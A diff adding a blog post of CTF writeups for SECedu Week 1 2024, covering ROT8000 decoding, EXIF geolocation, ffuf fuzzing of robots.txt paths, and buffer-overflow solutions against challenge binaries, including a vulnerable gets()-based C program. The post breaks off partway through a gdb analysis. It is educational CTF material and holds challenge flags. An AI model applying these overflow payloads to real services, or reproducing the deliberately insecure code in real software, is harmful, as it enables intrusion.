@@ -1,0 +1,1647 @@
+---
+layout: post
+title: SECedu Week 1 2024 - Challenge Writeups
+categories: [CTF Jeopardy]
+tags: [ctf jeopardy,forens,web,plc,pwn,crypto,misc]
+permalink: /posts/seceduweek12024
+img_path: /images/ctfs/secedu2024
+image:
+  path: iconweek1.png
+---
+
+<p>I am participating in the SECedu CTF 2024 online and found some of the challenges surprisingly difficult. I am playing in a team of 4 (<strong>MQCybersec Trojans</strong>) and we were in <strong>1st</strong> this week. The following is a writeup of the challenges I beat and how to crack them :p. Big thanks to the authors of the challenges from the various universities, and to my teammates: <a href="https://github.com/collab112">tulip</a>, <a href="https://x.com/finnersio">finnersio</a> and soap!</p>
+
+<p><a href="/images/ctfs/secedu2024/chartwk1.jpg" class="popup img-link"><img src="/images/ctfs/secedu2024/chartwk1.jpg" alt="ctfd graph" loading="lazy"></a></p>
+
+<h2 id="easy">
+<span class="me-2">Easy</span><a href="#easy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h2>
+
+<h3 id="encoded-secret-message">
+<span class="me-2">Encoded, secret message?</span><a href="#encoded-secret-message" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>While inspecting logs, we found a message being sent across our internal network. What could this be???</p>
+</blockquote>
+
+<p>This challenge we were given a string of characters: <code class="language-plaintext highlighter-rouge">籜籎籌籎籍籞粄籮籷籬簹籭籲籷籰籨籶簽籼籽簼类籨簹类籨籼簹籶簼籽籱簺籷籰粆</code>.</p>
+
+<p>Plugging this into Cyberchef, I remember generally that <strong>ROT8000</strong> converts to these kinds of characters. I am correct and it decodes to the flag.</p>
+
+<p><a href="https://www.dcode.fr/cipher-identifier">DCode’s Cipher Detection</a> also picks it up as ROT8000.</p>
+
+<p>Flag: <mark>SECEDU{enc0ding_m4st3r_0r_s0m3th1ng}</mark></p>
+
+<h2 id="medium">
+<span class="me-2">Medium</span><a href="#medium" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h2>
+
+<h3 id="portal">
+<span class="me-2">Portal</span><a href="#portal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>They’ve given us one of their programs running in the background to us. Let’s hope it’s not insecure!! (or in your case, that it’s not secure instead ;) )</p>
+</blockquote>
+
+<blockquote>
+  <p>nc chals.secedu.site 5000</p>
+</blockquote>
+
+<p>This challenge was completed by my teammate: <a href="https://github.com/collab112">tulip</a>!</p>
+
+<p>We were given this source code:</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre></td>
+<td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">checkIfA</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">);</span>
+<span class="kt">void</span> <span class="nf">printFile</span><span class="p">();</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">admin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">protect</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'\0'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"This is the company's employee portal.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"---------------------------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Please enter your name:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Please enter your password:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">gets</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+
+
+<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">"AAAAAAAAAA"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">"AAAAA"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"What a strange username or password!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">admin</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">protect</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span> <span class="o">&amp;&amp;</span> <span class="n">protect</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'A'</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome admin!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">printFile</span><span class="p">();</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"Employee not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">printFile</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">fgetc</span><span class="p">(</span><span class="n">file</span><span class="p">))</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span> <span class="p">{</span> <span class="n">fputc</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span> <span class="p">}</span>
+    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We can see that the <code class="language-plaintext highlighter-rouge">admin</code> variable is initially <code class="language-plaintext highlighter-rouge">0</code>, there are two <code class="language-plaintext highlighter-rouge">protect</code> values of <code class="language-plaintext highlighter-rouge">\0</code> and <code class="language-plaintext highlighter-rouge">A</code>, and there is a set limit on the <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> (10 and 5 respectively).</p>
+
+<p>The check then checks if the <code class="language-plaintext highlighter-rouge">username</code> matches <code class="language-plaintext highlighter-rouge">AAAAAAAAAA</code> or the <code class="language-plaintext highlighter-rouge">password</code> matches <code class="language-plaintext highlighter-rouge">AAAAA</code>, if it does it exits the program.</p>
+
+<p>The next check is for if the user is an admin:</p>
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">admin</code> value needs to be a non-0 value</li>
+  <li>The <code class="language-plaintext highlighter-rouge">protect[0]</code> must be <code class="language-plaintext highlighter-rouge">\0</code>
+</li>
+  <li>The <code class="language-plaintext highlighter-rouge">protect[1]</code> must be <code class="language-plaintext highlighter-rouge">A</code>
+</li>
+</ul>
+
+<p>Thats, it..?</p>
+
+<p>We can do a Buffer Overflow to break this challenge.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">strcmp</code> is only checking for an <strong>exact match</strong>, so we could use <code class="language-plaintext highlighter-rouge">B</code>’s or <code class="language-plaintext highlighter-rouge">a</code>’s or anything but <code class="language-plaintext highlighter-rouge">A</code>’s.</p>
+
+<p>We can then overflow to rewrite the <code class="language-plaintext highlighter-rouge">admin</code> value, but we need to preserve the values of <code class="language-plaintext highlighter-rouge">protect</code>.</p>
+
+<p>So, we can start with the overflow: <code class="language-plaintext highlighter-rouge">bbbbbbbbbb</code>, then add the protect values <code class="language-plaintext highlighter-rouge">\0</code> and <code class="language-plaintext highlighter-rouge">A</code>, then changing <code class="language-plaintext highlighter-rouge">admin</code> to a <code class="language-plaintext highlighter-rouge">1</code>.</p>
+
+<p>The value is <code class="language-plaintext highlighter-rouge">bbbbbbbbbb\0A1</code>, we can inject the NULL value to netcat with <code class="language-plaintext highlighter-rouge">CTRL+SHIFT+2</code>, we can then ignore the password value as its never used apart from the <code class="language-plaintext highlighter-rouge">strcmp</code> check.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td>
+<td class="rouge-code"><pre>$ nc chals.secedu.site 5000
+This is the company's employee portal.
+---------------------------------------------
+Please enter your name:
+bbbbbbbbbb^@A1
+Please enter your password:
+
+Welcome admin!
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Flag: <mark>SECEDU{por74l_to_n0wh3r3}</mark></p>
+
+<h3 id="on-the-way">
+<span class="me-2">On the way!</span><a href="#on-the-way" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>On our way to the main office, one of the employees sent us this photo, telling us that we needed to stop by on our way down. But unfortunately, they forgot to tell us where this was. Nice. Where abouts was this photo taken? Wrap in <code class="language-plaintext highlighter-rouge">SECEDU{}</code>. If it’s a city with one or more words, space with “_”.</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: Don’t forget to capitalise the city name</p>
+</blockquote>
+
+<p>We are supplied a <code class="language-plaintext highlighter-rouge">photo.jpg</code>.</p>
+
+<p>We can run <code class="language-plaintext highlighter-rouge">exiftool</code> on this picture to extract out any EXIF data.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td>
+<td class="rouge-code"><pre>$ exiftool photo.jpg
+ExifTool Version Number         : 12.70
+File Name                       : photo.jpg
+Directory                       : /home/n/Downloads
+File Size                       : 1836 kB
+File Modification Date/Time     : 2024:09:12 23:07:47+10:00
+File Access Date/Time           : 2024:09:12 23:07:47+10:00
+File Inode Change Date/Time     : 2024:09:12 23:07:49+10:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Little-endian (Intel, II)
+Make                            : Google
+Camera Model Name               : Pixel 6
+Orientation                     : Horizontal (normal)
+...
+GPS Date/Time                   : 2024:08:28 06:01:53Z
+GPS Latitude                    : 31 deg 25' 44.58" S
+GPS Longitude                   : 152 deg 54' 30.37" E
+...
+GPS Position                    : 31 deg 25' 44.58" S, 152 deg 54' 30.37" E
+...
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We can see the <code class="language-plaintext highlighter-rouge">GPS</code> headers storing the position of the photo being taken.</p>
+
+<p>This can be converted to a <a href="https://www.google.com/maps/place/-31.42905,152.90843">Google Maps URL</a>, which showcases its <strong>Port Macquarie</strong>.</p>
+
+<p>Flag: <mark>SECEDU{Port_Macquarie}</mark></p>
+
+<h3 id="crawler">
+<span class="me-2">Crawler</span><a href="#crawler" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>Instead of properly updating their list of websites when they need to, ORG-A has instead just appended their new pages, and hasn’t removed any pages that they’ve taken down.</p>
+</blockquote>
+
+<blockquote>
+  <p>Find the page that is still up and running.</p>
+</blockquote>
+
+<blockquote>
+  <p>Vuln scans on infrastructure are out of scope, and aren’t very relevant here. To be clear, there is no requirement to probe infrastructure in this way.</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: chals.secedu.site:4999</p>
+</blockquote>
+
+<blockquote>
+  <p>Hint: Is there a conventional way to indicate to crawlers that you don’t want a website indexed?</p>
+</blockquote>
+
+<p>Looking at <code class="language-plaintext highlighter-rouge">chals.secedu.site:4999</code> is a HTTP server, the root of the site returning this:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td>
+<td class="rouge-code"><pre>                    This is a normal website.
+
+
+
+                    
+                               (
+                               )
+                               (
+                        /\  .-"""-.  /\
+                       //\\/  ,,,  \//\\
+                       |/\| ,;;;;;, |/\|
+                       //\\\;-"""-;///\\
+                      //  \/   .   \/  \\
+                     (| ,-_| \ | / |_-, |)
+                       //`__\.-.-./__`\\
+                      // /.-(() ())-.\ \\
+                     (\ |)   '---'   (| /)
+                      ` (|           |) `
+                        \)           (/
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Checking <code class="language-plaintext highlighter-rouge">/robots.txt</code> we are given a long list of disallowed URLs.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td>
+<td class="rouge-code"><pre>User-agent: crawleroonie
+Disallow: /21783c459d191dfa316089d6a92e12b6.txt
+Disallow: /705901f6c304c0241cc280c554545a03.txt
+Disallow: /cfaed1eedebe78cdc97b463eadae5496.txt
+Disallow: /b075cb4e9b412a423f75fa1c1e2372c4.txt
+Disallow: /864d6f99de9586ec3645cda069505d58.txt
+Disallow: /da88fbf2659689cd1f63151284deca3a.txt
+Disallow: /d749dfba7d82ce432aa29003aa10142a.txt
+Disallow: /a22a8352622c5e598b4a1445c7ed66c5.txt
+Disallow: /ab1cb7fba3fb1078dd8b1f1a4cf10052.txt
+Disallow: /67d769a20963cb5f4111dfea3538ff6d.txt
+Disallow: /0de16dde4e4eef57bd2ca85fea70e3e8.txt
+Disallow: /085fc0f95c6166f12868802a169521cc.txt
+Disallow: /5a011b23e58c207514b75a41db320d65.txt
+Disallow: /c9442d9464989b2bcf7c058feb4ea903.txt
+Disallow: /988cd933fcca577b7f62091f3ee3a449.txt
+...
+Disallow: /648dac3911383260e21fc523b552e37a.txt
+Disallow: /6d0aebad2ab918535acdf1f09481aa9e.txt
+Disallow: /87e4a94bf95f00a36b3efd99aa336ac1.txt
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>I copied the full list of URLs, excluding the <code class="language-plaintext highlighter-rouge">User-agent</code> line, and filtered it down to a wordlist.</p>
+
+<p>I then use <code class="language-plaintext highlighter-rouge">ffuf</code> to find any valid endpoints:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td>
+<td class="rouge-code"><pre>$ ffuf -w robots-wordlist.txt -u 'http://chals.secedu.site:4999/FUZZ'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://chals.secedu.site:4999/FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+224029dc48091e43908719211cfa63e7.txt [Status: 200, Size: 33, Words: 1, Lines: 2]
+:: Progress: [1000/1000]&nbsp;:: Job [1/1] :: 1000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Visiting the only endpoint to respond, we get the flag.</p>
+
+<p>Flag: <mark>SECEDU{th3r3_g0es_0ur_b3ndwidth}</mark></p>
+
+<h3 id="overflowing-with-files">
+<span class="me-2">Overflowing with files</span><a href="#overflowing-with-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>They also seem to have quite an interesting top-secret file delivery system, developed in C of all things?! Find a way to get the contents of the top-secret document</p>
+</blockquote>
+
+<blockquote>
+  <p>nc chals.secedu.site 5001</p>
+</blockquote>
+
+<p>This challenges writeup was written by my friend <a href="https://x.com/finnersio">finnersio</a>!</p>
+
+<p>From the challenge description we know the program was written in C and we can analyse the program in <code class="language-plaintext highlighter-rouge">gdb</code>.</p>
+
+<p>Running the program we see the top-secret document is at the memory address <code class="language-plaintext highlighter-rouge">0x4011f6</code>.</p>
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td>
+<td class="rouge-code"><pre>./chal
+Welcome to ORG-A<span class="s1">'s epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011f6
+Please don'</span>t visit this, okay?
+Response
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Loading up gdb, we can run <code class="language-plaintext highlighter-rouge">info functions</code> to see what symbols are left in the binary. We see among others a function called <code class="language-plaintext highlighter-rouge">win</code> at <code class="language-plaintext highlighter-rouge">0x4011f6</code>, we know where we need to get to.</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td>
+<td class="rouge-code"><pre><span class="n">gdb</span> <span class="n">chal</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">functions</span>
+<span class="n">All</span> <span class="n">defined</span> <span class="n">functions</span><span class="o">:</span>
+
+<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="o">:</span>
+<span class="mh">0x0000000000401000</span>  <span class="n">_init</span>
+<span class="p">...</span>
+<span class="mh">0x00000000004011f6</span>  <span class="n">win</span>
+<span class="mh">0x0000000000401268</span>  <span class="n">exiting</span>
+<span class="mh">0x0000000000401282</span>  <span class="n">main</span>
+<span class="p">...</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Taking a look at the main function, there’s not much we care about until towards the end:</p>
+
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td>
+<td class="rouge-code"><pre><span class="cp"># Note I am using intel disassembly flavor, not AT&amp;T
+</span><span class="mh">0x00000000004012f6</span> <span class="o">&lt;+</span><span class="mi">116</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x401100</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x00000000004012fb</span> <span class="o">&lt;+</span><span class="mi">121</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span>
+<span class="mh">0x00000000004012ff</span> <span class="o">&lt;+</span><span class="mi">125</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x0000000000401302</span> <span class="o">&lt;+</span><span class="mi">128</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xe37</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x402140</span>
+<span class="mh">0x0000000000401309</span> <span class="o">&lt;+</span><span class="mi">135</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x000000000040130c</span> <span class="o">&lt;+</span><span class="mi">138</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x0000000000401311</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x4010c0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000401316</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span>
+<span class="mh">0x000000000040131a</span> <span class="o">&lt;+</span><span class="mi">152</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="n">rax</span>
+<span class="mh">0x000000000040131c</span> <span class="o">&lt;+</span><span class="mi">154</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x0000000000401321</span> <span class="o">&lt;+</span><span class="mi">159</span><span class="o">&gt;:</span>	<span class="n">leave</span>
+<span class="mh">0x0000000000401322</span> <span class="o">&lt;+</span><span class="mi">160</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We see a call to <code class="language-plaintext highlighter-rouge">scanf</code> to capture the user’s input, and another call to <code class="language-plaintext highlighter-rouge">prinf</code>.  But we also see the return address (<code class="language-plaintext highlighter-rouge">rax</code>) being assigned to a value offset of the base pointer (<code class="language-plaintext highlighter-rouge">rbp</code>).</p>
+
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre><span class="mh">0x0000000000401316</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Let’s see how our data is being stored in the program, we will set a breakpoint at the statement above.</p>
+
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td>
+<td class="rouge-code"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">152</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x40131a</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">ORG</span><span class="o">-</span><span class="n">A</span><span class="err">'</span><span class="n">s</span> <span class="n">epic</span> <span class="s">"File distribution system"</span><span class="o">!</span> <span class="n">Here</span> <span class="n">is</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">function</span> <span class="n">that</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">top</span><span class="o">-</span><span class="n">secret</span> <span class="n">documents</span><span class="o">:</span> <span class="mh">0x4011f6</span>
+<span class="n">Please</span> <span class="n">don</span><span class="err">'</span><span class="n">t</span> <span class="n">visit</span> <span class="n">this</span><span class="p">,</span> <span class="n">okay</span><span class="o">?</span>
+<span class="n">Response</span><span class="o">:</span> <span class="n">AAAAAAAAAAAAAAAAAAA</span>
+<span class="n">Okay</span><span class="p">,</span> <span class="n">you</span> <span class="n">know</span> <span class="n">what</span><span class="o">?</span> <span class="n">Lets</span> <span class="n">go</span> <span class="n">to</span> <span class="mh">0x401268</span><span class="o">!!</span>
+ <span class="n">Andddd</span><span class="p">....</span> <span class="n">here</span> <span class="n">we</span> <span class="n">go</span><span class="o">!</span>
+
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000000000040131a</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Looking at the stack pointer, we see our input and we know it is being stored on the stack. Let’s see if we can overflow the buffer and change <code class="language-plaintext highlighter-rouge">rax</code> to the secret-document address.</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="err">$</span><span class="n">rsp</span>
+<span class="mh">0x7fffffffe090</span><span class="o">:</span>	<span class="sc">'A'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
